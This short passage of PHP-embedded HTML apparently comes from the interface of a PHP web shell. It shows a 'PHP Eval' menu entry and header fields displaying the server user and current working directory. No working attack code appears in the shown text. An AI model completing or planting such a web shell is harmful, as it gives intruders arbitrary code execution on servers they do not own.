        <a class="menu_options" href="#action=php" onclick="g(\'Php\')">PHP Eval</a>
    </div>
    <div>
        <span class="header_vars">User:</span> <span class="header_values">'.$user.'</span> |
        <span class="header_vars">PWD:</span> <span class="header_values">'.$cwd_links.'</span> |
